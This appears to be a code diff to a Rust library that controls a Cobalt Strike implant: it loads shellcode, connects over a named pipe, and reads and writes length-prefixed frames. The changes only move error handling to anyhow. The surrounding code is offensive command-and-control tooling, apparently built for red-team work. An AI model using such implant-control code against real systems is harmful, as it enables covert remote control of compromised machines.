@@ -35,6 +35,8 @@ use windows::{
     },
 };
 
+use anyhow::anyhow;
+
 /// handle to a running cobalt strike implant.  use create implant from buf to create
 /// and instance of this struct
 pub struct Implant {
@@ -104,21 +106,21 @@ impl Write for Implant {
 /// size followed by a buffer of that size.
 pub trait CSFrameRead {
     /// Read the frame.
-    fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
+    fn read_frame(&mut self) -> anyhow::Result<Vec<u8>>;
 }
 
 /// Write a single cobaltstrike to a writeable.  writes a 32le size and then the buffer
 /// provided.
 pub trait CSFrameWrite {
     /// Write the frame.
-    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>>;
+    fn write_frame(&mut self, data: Vec<u8>) -> anyhow::Result<()>;
 }
 
 impl<T> CSFrameRead for T
 where
     T: Read,
 {
-    fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    fn read_frame(&mut self) -> anyhow::Result<Vec<u8>> {
         let mut size_buf = [0; 4];
         self.read_exact(&mut size_buf)?;
         let size = u32::from_le_bytes(size_buf);
@@ -131,7 +133,7 @@ impl<T> CSFrameWrite for T
 where
     T: Write,
 {
-    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
+    fn write_frame(&mut self, data: Vec<u8>) -> anyhow::Result<()> {
         let size: u32 = data.len().try_into()?;
         self.write_all(&size.to_le_bytes())?;
         self.write_all(&data)?;
@@ -147,7 +149,7 @@ where
 pub fn create_implant_from_buf(
     shell_code: Vec<u8>,
     pipename: &str,
-) -> Result<Implant, Error> {
+) -> anyhow::Result<Implant> {
     let full_pipename = format!("\\\\.\\pipe\\{}", pipename);
     unsafe {
         let buf =
@@ -184,7 +186,7 @@ pub fn create_implant_from_buf(
             } else {
                 count += 1;
                 if count > 10 {
-                    return Err(Error::from(ErrorKind::Other));
+                    return Err(anyhow!("Timed out"));
                 }
                 sleep(Duration::from_secs(1));
             };
